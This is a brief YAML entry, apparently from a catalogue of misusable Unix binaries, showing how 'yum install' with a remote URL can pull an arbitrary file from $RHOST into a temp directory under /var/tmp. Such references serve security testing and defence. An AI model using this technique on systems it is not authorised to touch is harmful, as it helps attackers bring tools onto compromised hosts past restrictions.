---
functions:
  file-download:
    - description: Fetch a remote file via HTTP GET request. The file on the remote host must have an extension of `.rpm`, the content does not have to be an RPM file. The file will be downloaded to a randomly created directory in `/var/tmp`, for example `/var/tmp/yum-root-cR0O4h/`.
      code: |
        yum install http://$RHOST/$RFILE
---
